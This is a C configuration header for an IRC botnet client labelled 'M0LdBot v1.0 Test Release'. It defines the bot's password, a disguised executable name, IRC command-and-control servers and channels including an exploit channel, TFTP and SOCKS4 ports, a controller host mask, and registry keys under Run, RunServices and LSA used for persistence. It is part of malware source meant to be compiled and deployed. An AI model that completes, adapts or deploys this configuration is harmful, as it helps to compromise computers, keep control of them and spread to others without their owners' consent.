#pragma pack(1)
//Bot configuration

char password[] = "m0ld0wns";
char filename[] = "reddick.exe";
char valuename[] = "dick";
char prefix = '.';
const int maxaliases = 16;
const int maxlogins = 3;
char nickconst[] = "M0Ld[]";
char version[] = "[M0LdBot v1.0 Test Release]";
char botid[] = "mbtr";
int maxrand = 8;
int nicktype = CONSTNICK;
int tftpport = 69;
int socks4port = 1026;
int cryptkey = 0;
BOOL rndfilename = FALSE;
BOOL topiccmd = TRUE;
BOOL regrun = TRUE;
BOOL nickprefix = TRUE;
char *authost[] = {"x@M0LdsBotNet", "\0"};

//server #1
char server[] = "server";
char serverpass[] = "pw";
char exploitchan[] = "#m0ld";
int port = 6667;
char channel[] = "#m0ld";
char chanpass[] = "inter";

//server #2
char server2[] = "server2";
int port2 = 6667;
char channel2[] = "#m0ld";
char chanpass2[] = "inter";

//reg keys
char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";